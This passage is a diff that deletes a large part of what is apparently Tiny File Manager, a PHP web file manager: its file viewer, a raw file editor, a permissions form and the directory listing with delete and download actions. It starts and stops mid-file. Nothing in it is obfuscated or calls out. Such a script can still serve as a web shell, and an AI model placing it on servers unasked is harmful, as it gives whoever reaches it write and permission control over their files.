-    if ($file == '' || !is_file($path . '/' . $file) || !fm_is_exclude_items($file)) {
-        fm_set_msg(lng('File not found'), 'error');
-        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-    }
-
-    fm_show_header(); // HEADER
-    fm_show_nav_path(FM_PATH); // current path
-
-    $file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file);
-    $file_path = $path . '/' . $file;
-
-    $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
-    $mime_type = fm_get_mime_type($file_path);
-    $filesize_raw = fm_get_size($file_path);
-    $filesize = fm_get_filesize($filesize_raw);
-
-    $is_zip = false;
-    $is_gzip = false;
-    $is_image = false;
-    $is_audio = false;
-    $is_video = false;
-    $is_text = false;
-    $is_onlineViewer = false;
-
-    $view_title = 'File';
-    $filenames = false; // for zip
-    $content = ''; // for text
-    $online_viewer = strtolower(FM_DOC_VIEWER);
-
-    if($online_viewer && $online_viewer !== 'false' && in_array($ext, fm_get_onlineViewer_exts())){
-        $is_onlineViewer = true;
-    }
-    elseif ($ext == 'zip' || $ext == 'tar') {
-        $is_zip = true;
-        $view_title = 'Archive';
-        $filenames = fm_get_zif_info($file_path, $ext);
-    } elseif (in_array($ext, fm_get_image_exts())) {
-        $is_image = true;
-        $view_title = 'Image';
-    } elseif (in_array($ext, fm_get_audio_exts())) {
-        $is_audio = true;
-        $view_title = 'Audio';
-    } elseif (in_array($ext, fm_get_video_exts())) {
-        $is_video = true;
-        $view_title = 'Video';
-    } elseif (in_array($ext, fm_get_text_exts()) || substr($mime_type, 0, 4) == 'text' || in_array($mime_type, fm_get_text_mimes())) {
-        $is_text = true;
-        $content = file_get_contents($file_path);
-    }
-
-    ?>
-    <div class="row">
-        <div class="col-12">
-            <p class="break-word"><b><?php echo lng($view_title) ?> "<?php echo fm_enc(fm_convert_win($file)) ?>"</b></p>
-            <p class="break-word">
-                <?php $display_path = fm_get_display_path($file_path); ?>
-                <strong><?php echo $display_path['label']; ?>:</strong> <?php echo $display_path['path']; ?><br>
-                <strong>File size:</strong> <?php echo ($filesize_raw <= 1000) ? "$filesize_raw bytes" : $filesize; ?><br>
-                <strong>MIME-type:</strong> <?php echo $mime_type ?><br>
-                <?php
-                // ZIP info
-                if (($is_zip || $is_gzip) && $filenames !== false) {
-                    $total_files = 0;
-                    $total_comp = 0;
-                    $total_uncomp = 0;
-                    foreach ($filenames as $fn) {
-                        if (!$fn['folder']) {
-                            $total_files++;
-                        }
-                        $total_comp += $fn['compressed_size'];
-                        $total_uncomp += $fn['filesize'];
-                    }
-                    ?>
-                    <?php echo lng('Files in archive') ?>: <?php echo $total_files ?><br>
-                    <?php echo lng('Total size') ?>: <?php echo fm_get_filesize($total_uncomp) ?><br>
-                    <?php echo lng('Size in archive') ?>: <?php echo fm_get_filesize($total_comp) ?><br>
-                    <?php echo lng('Compression') ?>: <?php echo round(($total_comp / max($total_uncomp, 1)) * 100) ?>%<br>
-                    <?php
-                }
-                // Image info
-                if ($is_image) {
-                    $image_size = getimagesize($file_path);
-                    echo '<strong>'.lng('Image size').':</strong> ' . (isset($image_size[0]) ? $image_size[0] : '0') . ' x ' . (isset($image_size[1]) ? $image_size[1] : '0') . '<br>';
-                }
-                // Text info
-                if ($is_text) {
-                    $is_utf8 = fm_is_utf8($content);
-                    if (function_exists('iconv')) {
-                        if (!$is_utf8) {
-                            $content = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $content);
-                        }
-                    }
-                    echo '<strong>'.lng('Charset').':</strong> ' . ($is_utf8 ? 'utf-8' : '8 bit') . '<br>';
-                }
-                ?>
-            </p>
-            <div class="d-flex align-items-center mb-3">
-                <form method="post" class="d-inline ms-2" action="?p=<?php echo urlencode(FM_PATH) ?>&amp;dl=<?php echo urlencode($file) ?>">
-                    <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
-                    <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0"><i class="fa fa-cloud-download"></i> <?php echo lng('Download') ?></button> &nbsp;
-                </form>
-                <b class="ms-2"><a href="<?php echo fm_enc($file_url) ?>" target="_blank"><i class="fa fa-external-link-square"></i> <?php echo lng('Open') ?></a></b>
-                <?php
-                // ZIP actions
-                if (!FM_READONLY && ($is_zip || $is_gzip) && $filenames !== false) {
-                    $zip_name = pathinfo($file_path, PATHINFO_FILENAME);
-                    ?>
-                    <form method="post" class="d-inline ms-2">
-                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
-                        <input type="hidden" name="unzip" value="<?php echo urlencode($file); ?>">
-                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;"><i class="fa fa-check-circle"></i> <?php echo lng('UnZip') ?></button>
-                    </form>&nbsp;
-                    <form method="post" class="d-inline ms-2">
-                        <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
-                        <input type="hidden" name="unzip" value="<?php echo urlencode($file); ?>">
-                        <input type="hidden" name="tofolder" value="1">
-                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;" title="UnZip to <?php echo fm_enc($zip_name) ?>"><i class="fa fa-check-circle"></i> <?php echo lng('UnZipToFolder') ?></button>
-                    </form>&nbsp;
-                    <?php
-                }
-                if ($is_text && !FM_READONLY) {
-                    ?>
-                    <b class="ms-2"><a href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>" class="edit-file"><i class="fa fa-pencil-square"></i> <?php echo lng('Edit') ?>
-                        </a></b> &nbsp;
-                    <b class="ms-2"><a href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>&env=ace"
-                            class="edit-file"><i class="fa fa-pencil-square-o"></i> <?php echo lng('AdvancedEditor') ?>
-                        </a></b> &nbsp;
-                <?php } ?>
-                <b class="ms-2"><a href="?p=<?php echo urlencode(FM_PATH) ?>"><i class="fa fa-chevron-circle-left go-back"></i> <?php echo lng('Back') ?></a></b>
-            </div>
-            <?php
-            if($is_onlineViewer) {
-                if($online_viewer == 'google') {
-                    echo '<iframe src="https://docs.google.com/viewer?embedded=true&hl=en&url=' . fm_enc($file_url) . '" frameborder="no" style="width:100%;min-height:460px"></iframe>';
-                } else if($online_viewer == 'microsoft') {
-                    echo '<iframe src="https://view.officeapps.live.com/op/embed.aspx?src=' . fm_enc($file_url) . '" frameborder="no" style="width:100%;min-height:460px"></iframe>';
-                }
-            } elseif ($is_zip) {
-                // ZIP content
-                if ($filenames !== false) {
-                    echo '<code class="maxheight">';
-                    foreach ($filenames as $fn) {
-                        if ($fn['folder']) {
-                            echo '<b>' . fm_enc($fn['name']) . '</b><br>';
-                        } else {
-                            echo $fn['name'] . ' (' . fm_get_filesize($fn['filesize']) . ')<br>';
-                        }
-                    }
-                    echo '</code>';
-                } else {
-                    echo '<p>'.lng('Error while fetching archive info').'</p>';
-                }
-            } elseif ($is_image) {
-                // Image content
-                if (in_array($ext, array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico', 'svg', 'webp', 'avif'))) {
-                    echo '<p><input type="checkbox" id="preview-img-zoomCheck"><label for="preview-img-zoomCheck"><img src="' . fm_enc($file_url) . '" alt="image" class="preview-img"></label></p>';
-                }
-            } elseif ($is_audio) {
-                // Audio content
-                echo '<p><audio src="' . fm_enc($file_url) . '" controls preload="metadata"></audio></p>';
-            } elseif ($is_video) {
-                // Video content
-                echo '<div class="preview-video"><video src="' . fm_enc($file_url) . '" width="640" height="360" controls preload="metadata"></video></div>';
-            } elseif ($is_text) {
-                if (FM_USE_HIGHLIGHTJS) {
-                    // highlight
-                    $hljs_classes = array(
-                        'shtml' => 'xml',
-                        'htaccess' => 'apache',
-                        'phtml' => 'php',
-                        'lock' => 'json',
-                        'svg' => 'xml',
-                    );
-                    $hljs_class = isset($hljs_classes[$ext]) ? 'lang-' . $hljs_classes[$ext] : 'lang-' . $ext;
-                    if (empty($ext) || in_array(strtolower($file), fm_get_text_names()) || preg_match('#\.min\.(css|js)$#i', $file)) {
-                        $hljs_class = 'nohighlight';
-                    }
-                    $content = '<pre class="with-hljs"><code class="' . $hljs_class . '">' . fm_enc($content) . '</code></pre>';
-                } elseif (in_array($ext, array('php', 'php4', 'php5', 'phtml', 'phps'))) {
-                    // php highlight
-                    $content = highlight_string($content, true);
-                } else {
-                    $content = '<pre>' . fm_enc($content) . '</pre>';
-                }
-                echo $content;
-            }
-            ?>
-        </div>
-    </div>
-    <?php
-        fm_show_footer();
-    exit;
-}
-
-// file editor
-if (isset($_GET['edit']) && !FM_READONLY) {
-    $file = $_GET['edit'];
-    $file = fm_clean_path($file, false);
-    $file = str_replace('/', '', $file);
-    if ($file == '' || !is_file($path . '/' . $file) || !fm_is_exclude_items($file)) {
-        fm_set_msg(lng('File not found'), 'error');
-        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-    }
-    $editFile = ' : <i><b>'. $file. '</b></i>';
-    header('X-XSS-Protection:0');
-    fm_show_header(); // HEADER
-    fm_show_nav_path(FM_PATH); // current path
-
-    $file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file);
-    $file_path = $path . '/' . $file;
-
-    // normal editer
-    $isNormalEditor = true;
-    if (isset($_GET['env'])) {
-        if ($_GET['env'] == "ace") {
-            $isNormalEditor = false;
-        }
-    }
-
-    // Save File
-    if (isset($_POST['savedata'])) {
-        $writedata = $_POST['savedata'];
-        $fd = fopen($file_path, "w");
-        @fwrite($fd, $writedata);
-        fclose($fd);
-        fm_set_msg(lng('File Saved Successfully'));
-    }
-
-    $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
-    $mime_type = fm_get_mime_type($file_path);
-    $filesize = filesize($file_path);
-    $is_text = false;
-    $content = ''; // for text
-
-    if (in_array($ext, fm_get_text_exts()) || substr($mime_type, 0, 4) == 'text' || in_array($mime_type, fm_get_text_mimes())) {
-        $is_text = true;
-        $content = file_get_contents($file_path);
-    }
-
-    ?>
-    <div class="path">
-        <div class="row">
-            <div class="col-xs-12 col-sm-5 col-lg-6 pt-1">
-                <div class="btn-toolbar" role="toolbar">
-                    <?php if (!$isNormalEditor) { ?>
-                        <div class="btn-group js-ace-toolbar">
-                            <button data-cmd="none" data-option="fullscreen" class="btn btn-sm btn-outline-secondary" id="js-ace-fullscreen" title="<?php echo lng('Fullscreen') ?>"><i class="fa fa-expand" title="<?php echo lng('Fullscreen') ?>"></i></button>
-                            <button data-cmd="find" class="btn btn-sm btn-outline-secondary" id="js-ace-search" title="<?php echo lng('Search') ?>"><i class="fa fa-search" title="<?php echo lng('Search') ?>"></i></button>
-                            <button data-cmd="undo" class="btn btn-sm btn-outline-secondary" id="js-ace-undo" title="<?php echo lng('Undo') ?>"><i class="fa fa-undo" title="<?php echo lng('Undo') ?>"></i></button>
-                            <button data-cmd="redo" class="btn btn-sm btn-outline-secondary" id="js-ace-redo" title="<?php echo lng('Redo') ?>"><i class="fa fa-repeat" title="<?php echo lng('Redo') ?>"></i></button>
-                            <button data-cmd="none" data-option="wrap" class="btn btn-sm btn-outline-secondary" id="js-ace-wordWrap" title="<?php echo lng('Word Wrap') ?>"><i class="fa fa-text-width" title="<?php echo lng('Word Wrap') ?>"></i></button>
-                            <select id="js-ace-mode" data-type="mode" title="<?php echo lng('Select Document Type') ?>" class="btn-outline-secondary border-start-0 d-none d-md-block"><option>-- <?php echo lng('Select Mode') ?> --</option></select>
-                            <select id="js-ace-theme" data-type="theme" title="<?php echo lng('Select Theme') ?>" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- <?php echo lng('Select Theme') ?> --</option></select>
-                            <select id="js-ace-fontSize" data-type="fontSize" title="<?php echo lng('Select Font Size') ?>" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- <?php echo lng('Select Font Size') ?> --</option></select>
-                        </div>
-                    <?php } ?>
-                </div>
-            </div>
-            <div class="edit-file-actions col-xs-12 col-sm-7 col-lg-6 text-end pt-1">
-                <a title="<?php echo lng('Back') ?>" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;view=<?php echo urlencode($file) ?>"><i class="fa fa-reply-all"></i> <?php echo lng('Back') ?></a>
-                <a title="<?php echo lng('BackUp') ?>" class="btn btn-sm btn-outline-primary" href="javascript:void(0);" onclick="backup('<?php echo urlencode(trim(FM_PATH)) ?>','<?php echo urlencode($file) ?>')"><i class="fa fa-database"></i> <?php echo lng('BackUp') ?></a>
-                <?php if ($is_text) { ?>
-                    <?php if ($isNormalEditor) { ?>
-                        <a title="Advanced" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>&amp;env=ace"><i class="fa fa-pencil-square-o"></i> <?php echo lng('AdvancedEditor') ?></a>
-                        <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo fm_enc($file_url) ?>" onclick="edit_save(this,'nrl')"><i class="fa fa-floppy-o"></i> Save
-                        </button>
-                    <?php } else { ?>
-                        <a title="Plain Editor" class="btn btn-sm btn-outline-primary" href="?p=<?php echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php echo urlencode($file) ?>"><i class="fa fa-text-height"></i> <?php echo lng('NormalEditor') ?></a>
-                        <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php echo fm_enc($file_url) ?>" onclick="edit_save(this,'ace')"><i class="fa fa-floppy-o"></i> <?php echo lng('Save') ?>
-                        </button>
-                    <?php } ?>
-                <?php } ?>
-            </div>
-        </div>
-        <?php
-        if ($is_text && $isNormalEditor) {
-            echo '<textarea class="mt-2" id="normal-editor" rows="33" cols="120" style="width: 99.5%;">' . htmlspecialchars($content) . '</textarea>';
-            echo '<script>document.addEventListener("keydown", function(e) {if ((window.navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)  && e.keyCode == 83) { e.preventDefault();edit_save(this,"nrl");}}, false);</script>';
-        } elseif ($is_text) {
-            echo '<div id="editor" contenteditable="true">' . htmlspecialchars($content) . '</div>';
-        } else {
-            fm_set_msg(lng('FILE EXTENSION HAS NOT SUPPORTED'), 'error');
-        }
-        ?>
-    </div>
-    <?php
-    fm_show_footer();
-    exit;
-}
-
-// chmod (not for Windows)
-if (isset($_GET['chmod']) && !FM_READONLY && !FM_IS_WIN) {
-    $file = $_GET['chmod'];
-    $file = fm_clean_path($file);
-    $file = str_replace('/', '', $file);
-    if ($file == '' || (!is_file($path . '/' . $file) && !is_dir($path . '/' . $file))) {
-        fm_set_msg(lng('File not found'), 'error');
-        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-    }
-
-    fm_show_header(); // HEADER
-    fm_show_nav_path(FM_PATH); // current path
-
-    $file_url = FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $file;
-    $file_path = $path . '/' . $file;
-
-    $mode = fileperms($path . '/' . $file);
-    ?>
-    <div class="path">
-        <div class="card mb-2 <?php echo fm_get_theme(); ?>">
-            <h6 class="card-header">
-                <?php echo lng('ChangePermissions') ?>
-            </h6>
-            <div class="card-body">
-                <p class="card-text">
-                    <?php $display_path = fm_get_display_path($file_path); ?>
-                    <?php echo $display_path['label']; ?>: <?php echo $display_path['path']; ?><br>
-                </p>
-                <form action="" method="post">
-                    <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
-                    <input type="hidden" name="chmod" value="<?php echo fm_enc($file) ?>">
-
-                    <table class="table compact-table <?php echo fm_get_theme(); ?>">
-                        <tr>
-                            <td></td>
-                            <td><b><?php echo lng('Owner') ?></b></td>
-                            <td><b><?php echo lng('Group') ?></b></td>
-                            <td><b><?php echo lng('Other') ?></b></td>
-                        </tr>
-                        <tr>
-                            <td style="text-align: right"><b><?php echo lng('Read') ?></b></td>
-                            <td><label><input type="checkbox" name="ur" value="1"<?php echo ($mode & 00400) ? ' checked' : '' ?>></label></td>
-                            <td><label><input type="checkbox" name="gr" value="1"<?php echo ($mode & 00040) ? ' checked' : '' ?>></label></td>
-                            <td><label><input type="checkbox" name="or" value="1"<?php echo ($mode & 00004) ? ' checked' : '' ?>></label></td>
-                        </tr>
-                        <tr>
-                            <td style="text-align: right"><b><?php echo lng('Write') ?></b></td>
-                            <td><label><input type="checkbox" name="uw" value="1"<?php echo ($mode & 00200) ? ' checked' : '' ?>></label></td>
-                            <td><label><input type="checkbox" name="gw" value="1"<?php echo ($mode & 00020) ? ' checked' : '' ?>></label></td>
-                            <td><label><input type="checkbox" name="ow" value="1"<?php echo ($mode & 00002) ? ' checked' : '' ?>></label></td>
-                        </tr>
-                        <tr>
-                            <td style="text-align: right"><b><?php echo lng('Execute') ?></b></td>
-                            <td><label><input type="checkbox" name="ux" value="1"<?php echo ($mode & 00100) ? ' checked' : '' ?>></label></td>
-                            <td><label><input type="checkbox" name="gx" value="1"<?php echo ($mode & 00010) ? ' checked' : '' ?>></label></td>
-                            <td><label><input type="checkbox" name="ox" value="1"<?php echo ($mode & 00001) ? ' checked' : '' ?>></label></td>
-                        </tr>
-                    </table>
-
-                    <p>
-                       <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>"> 
-                        <b><a href="?p=<?php echo urlencode(FM_PATH) ?>" class="btn btn-outline-primary"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel') ?></a></b>&nbsp;
-                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('Change') ?></button>
-                    </p>
-                </form>
-            </div>
-        </div>
-    </div>
-    <?php
-    fm_show_footer();
-    exit;
-}
-
-// --- TINYFILEMANAGER MAIN ---
-fm_show_header(); // HEADER
-fm_show_nav_path(FM_PATH); // current path
-
-// show alert messages
-fm_show_message();
-
-$num_files = count($files);
-$num_folders = count($folders);
-$all_files_size = 0;
-$tableTheme = (FM_THEME == "dark") ? "text-white bg-dark table-dark" : "bg-white";
-?>
-<form action="" method="post" class="pt-3">
-    <input type="hidden" name="p" value="<?php echo fm_enc(FM_PATH) ?>">
-    <input type="hidden" name="group" value="1">
-    <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
-    <div class="table-responsive">
-        <table class="table table-bordered table-hover table-sm <?php echo $tableTheme; ?>" id="main-table">
-            <thead class="thead-white">
-            <tr>
-                <?php if (!FM_READONLY): ?>
-                    <th style="width:3%" class="custom-checkbox-header">
-                        <div class="custom-control custom-checkbox">
-                            <input type="checkbox" class="custom-control-input" id="js-select-all-items" onclick="checkbox_toggle()">
-                            <label class="custom-control-label" for="js-select-all-items"></label>
-                        </div>
-                    </th><?php endif; ?>
-                <th><?php echo lng('Name') ?></th>
-                <th><?php echo lng('Size') ?></th>
-                <th><?php echo lng('Modified') ?></th>
-                <?php if (!FM_IS_WIN && !$hide_Cols): ?>
-                    <th><?php echo lng('Perms') ?></th>
-                    <th><?php echo lng('Owner') ?></th><?php endif; ?>
-                <th><?php echo lng('Actions') ?></th>
-            </tr>
-            </thead>
-            <?php
-            // link to parent folder
-            if ($parent !== false) {
-                ?>
-                <tr><?php if (!FM_READONLY): ?>
-                    <td class="nosort"></td><?php endif; ?>
-                    <td class="border-0" data-sort><a href="?p=<?php echo urlencode($parent) ?>"><i class="fa fa-chevron-circle-left go-back"></i> ..</a></td>
-                    <td class="border-0" data-order></td>
-                    <td class="border-0" data-order></td>
-                    <td class="border-0"></td>
-                    <?php if (!FM_IS_WIN && !$hide_Cols) { ?>
-                        <td class="border-0"></td>
-                        <td class="border-0"></td>
-                    <?php } ?>
-                </tr>
-                <?php
-            }
-            $ii = 3399;
-            foreach ($folders as $f) {
-                $is_link = is_link($path . '/' . $f);
-                $img = $is_link ? 'icon-link_folder' : 'fa fa-folder-o';
-                $modif_raw = filemtime($path . '/' . $f);
-                $modif = date(FM_DATETIME_FORMAT, $modif_raw);
-                $date_sorting = strtotime(date("F d Y H:i:s.", $modif_raw));
-                $filesize_raw = "";
-                $filesize = lng('Folder');
-                $perms = substr(decoct(fileperms($path . '/' . $f)), -4);
-                if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
-                    $owner = posix_getpwuid(fileowner($path . '/' . $f));
-                    $group = posix_getgrgid(filegroup($path . '/' . $f));
-                    if ($owner === false) {
-                        $owner = array('name' => '?');
-                    }
-                    if ($group === false) {
-                        $group = array('name' => '?');
-                    }
-                } else {
-                    $owner = array('name' => '?');
-                    $group = array('name' => '?');
-                }
-                ?>
-                <tr>
-                    <?php if (!FM_READONLY): ?>
-                        <td class="custom-checkbox-td">
-                        <div class="custom-control custom-checkbox">
-                            <input type="checkbox" class="custom-control-input" id="<?php echo $ii ?>" name="file[]" value="<?php echo fm_enc($f) ?>">
-                            <label class="custom-control-label" for="<?php echo $ii ?>"></label>
-                        </div>
-                        </td><?php endif; ?>
-                    <td data-sort=<?php echo fm_convert_win(fm_enc($f)) ?>>
-                        <div class="filename"><a href="?p=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>"><i class="<?php echo $img ?>"></i> <?php echo fm_convert_win(fm_enc($f)) ?>
-                            </a><?php echo($is_link ? ' &rarr; <i>' . readlink($path . '/' . $f) . '</i>' : '') ?></div>
-                    </td>
-                    <td data-order="a-<?php echo str_pad($filesize_raw, 18, "0", STR_PAD_LEFT);?>">
-                        <?php echo $filesize; ?>
-                    </td>
-                    <td data-order="a-<?php echo $date_sorting;?>"><?php echo $modif ?></td>
-                    <?php if (!FM_IS_WIN && !$hide_Cols): ?>
-                        <td><?php if (!FM_READONLY): ?><a title="Change Permissions" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><?php echo $perms ?></a><?php else: ?><?php echo $perms ?><?php endif; ?>
-                        </td>
-                        <td><?php echo $owner['name'] . ':' . $group['name'] ?></td>
-                    <?php endif; ?>
-                    <td class="inline-actions"><?php if (!FM_READONLY): ?>
-                            <a title="<?php echo lng('Delete')?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;del=<?php echo urlencode($f) ?>" onclick="confirmDailog(event, '1028','<?php echo lng('Delete').' '.lng('Folder'); ?>','<?php echo urlencode($f) ?>', this.href);"> <i class="fa fa-trash-o" aria-hidden="true"></i></a>
-                            <a title="<?php echo lng('Rename')?>" href="#" onclick="rename('<?php echo fm_enc(addslashes(FM_PATH)) ?>', '<?php echo fm_enc(addslashes($f)) ?>');return false;"><i class="fa fa-pencil-square-o" aria-hidden="true"></i></a>
-                            <a title="<?php echo lng('CopyTo')?>..." href="?p=&amp;copy=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>"><i class="fa fa-files-o" aria-hidden="true"></i></a>
-                        <?php endif; ?>
-                        <a title="<?php echo lng('DirectLink')?>" href="<?php echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f . '/') ?>" target="_blank"><i class="fa fa-link" aria-hidden="true"></i></a>
-                    </td>
-                </tr>
-                <?php
-                flush();
-                $ii++;
-            }
-            $ik = 6070;
-            foreach ($files as $f) {
-                $is_link = is_link($path . '/' . $f);
-                $img = $is_link ? 'fa fa-file-text-o' : fm_get_file_icon_class($path . '/' . $f);
-                $modif_raw = filemtime($path . '/' . $f);
-                $modif = date(FM_DATETIME_FORMAT, $modif_raw);
-                $date_sorting = strtotime(date("F d Y H:i:s.", $modif_raw));
-                $filesize_raw = fm_get_size($path . '/' . $f);
-                $filesize = fm_get_filesize($filesize_raw);
-                $filelink = '?p=' . urlencode(FM_PATH) . '&amp;view=' . urlencode($f);
-                $all_files_size += $filesize_raw;
-                $perms = substr(decoct(fileperms($path . '/' . $f)), -4);
-                if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
-                    $owner = posix_getpwuid(fileowner($path . '/' . $f));
-                    $group = posix_getgrgid(filegroup($path . '/' . $f));
-                    if ($owner === false) {
-                        $owner = array('name' => '?');
-                    }
-                    if ($group === false) {
-                        $group = array('name' => '?');
-                    }
-                } else {
-                    $owner = array('name' => '?');
-                    $group = array('name' => '?');
-                }
-                ?>
-                <tr>
-                    <?php if (!FM_READONLY): ?>
-                        <td class="custom-checkbox-td">
-                        <div class="custom-control custom-checkbox">
-                            <input type="checkbox" class="custom-control-input" id="<?php echo $ik ?>" name="file[]" value="<?php echo fm_enc($f) ?>">
-                            <label class="custom-control-label" for="<?php echo $ik ?>"></label>
-                        </div>
-                        </td><?php endif; ?>
-                    <td data-sort=<?php echo fm_enc($f) ?>>
-                        <div class="filename">
-                        <?php
-                           if (in_array(strtolower(pathinfo($f, PATHINFO_EXTENSION)), array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico', 'svg', 'webp', 'avif'))): ?>
-                                <?php $imagePreview = fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f); ?>
-                                <a href="<?php echo $filelink ?>" data-preview-image="<?php echo $imagePreview ?>" title="<?php echo fm_enc($f) ?>">
-                           <?php else: ?>
-                                <a href="<?php echo $filelink ?>" title="<?php echo $f ?>">
-                            <?php endif; ?>
-                                    <i class="<?php echo $img ?>"></i> <?php echo fm_convert_win(fm_enc($f)) ?>
-                                </a>
-                                <?php echo($is_link ? ' &rarr; <i>' . readlink($path . '/' . $f) . '</i>' : '') ?>
-                        </div>
-                    </td>
-                    <td data-order="b-<?php echo str_pad($filesize_raw, 18, "0", STR_PAD_LEFT); ?>"><span title="<?php printf('%s bytes', $filesize_raw) ?>">
-                        <?php echo $filesize; ?>
-                        </span></td>
-                    <td data-order="b-<?php echo $date_sorting;?>"><?php echo $modif ?></td>
-                    <?php if (!FM_IS_WIN && !$hide_Cols): ?>
-                        <td><?php if (!FM_READONLY): ?><a title="<?php echo 'Change Permissions' ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><?php echo $perms ?></a><?php else: ?><?php echo $perms ?><?php endif; ?>
-                        </td>
-                        <td><?php echo fm_enc($owner['name'] . ':' . $group['name']) ?></td>
-                    <?php endif; ?>
-                    <td class="inline-actions">
-                        <?php if (!FM_READONLY): ?>
-                            <a title="<?php echo lng('Delete') ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;del=<?php echo urlencode($f) ?>" onclick="confirmDailog(event, 1209, '<?php echo lng('Delete').' '.lng('File'); ?>','<?php echo urlencode($f); ?>', this.href);"> <i class="fa fa-trash-o"></i></a>
-                            <a title="<?php echo lng('Rename') ?>" href="#" onclick="rename('<?php echo fm_enc(addslashes(FM_PATH)) ?>', '<?php echo fm_enc(addslashes($f)) ?>');return false;"><i class="fa fa-pencil-square-o"></i></a>
-                            <a title="<?php echo lng('CopyTo') ?>..."
-                               href="?p=<?php echo urlencode(FM_PATH) ?>&amp;copy=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>"><i class="fa fa-files-o"></i></a>
-                        <?php endif; ?>
-                        <a title="<?php echo lng('DirectLink') ?>" href="<?php echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $f) ?>" target="_blank"><i class="fa fa-link"></i></a>
-                        <a title="<?php echo lng('Download') ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;dl=<?php echo urlencode($f) ?>" onclick="confirmDailog(event, 1211, '<?php echo lng('Download'); ?>','<?php echo urlencode($f); ?>', this.href);"><i class="fa fa-download"></i></a>
-                    </td>
-                </tr>
-                <?php
-                flush();
-                $ik++;
-            }
-
-            if (empty($folders) && empty($files)) { ?>
-                <tfoot>
-                    <tr><?php if (!FM_READONLY): ?>
-                            <td></td><?php endif; ?>
-                        <td colspan="<?php echo (!FM_IS_WIN && !$hide_Cols) ? '6' : '4' ?>"><em><?php echo lng('Folder is empty') ?></em></td>
-                    </tr>
-                </tfoot>
-                <?php
-            } else { ?>
-                <tfoot>
-                    <tr>
-                        <td class="gray" colspan="<?php echo (!FM_IS_WIN && !$hide_Cols) ? (FM_READONLY ? '6' :'7') : (FM_READONLY ? '4' : '5') ?>">
-                            <?php echo lng('FullSize').': <span class="badge text-bg-light border-radius-0">'.fm_get_filesize($all_files_size).'</span>' ?>
-                            <?php echo lng('File').': <span class="badge text-bg-light border-radius-0">'.$num_files.'</span>' ?>
-                            <?php echo lng('Folder').': <span class="badge text-bg-light border-radius-0">'.$num_folders.'</span>' ?>
-                        </td>
-                    </tr>
-                </tfoot>
-                <?php } ?>
-        </table>
-    </div>
-
-    <div class="row">
-        <?php if (!FM_READONLY): ?>
-        <div class="col-xs-12 col-sm-9">
-            <ul class="list-inline footer-action">
-                <li class="list-inline-item"> <a href="#/select-all" class="btn btn-small btn-outline-primary btn-2" onclick="select_all();return false;"><i class="fa fa-check-square"></i> <?php echo lng('SelectAll') ?> </a></li>
-                <li class="list-inline-item"><a href="#/unselect-all" class="btn btn-small btn-outline-primary btn-2" onclick="unselect_all();return false;"><i class="fa fa-window-close"></i> <?php echo lng('UnSelectAll') ?> </a></li>
-                <li class="list-inline-item"><a href="#/invert-all" class="btn btn-small btn-outline-primary btn-2" onclick="invert_all();return false;"><i class="fa fa-th-list"></i> <?php echo lng('InvertSelection') ?> </a></li>
-                <li class="list-inline-item"><input type="submit" class="hidden" name="delete" id="a-delete" value="Delete" onclick="return confirm('<?php echo lng('Delete selected files and folders?'); ?>')">
-                    <a href="javascript:document.getElementById('a-delete').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-trash"></i> <?php echo lng('Delete') ?> </a></li>
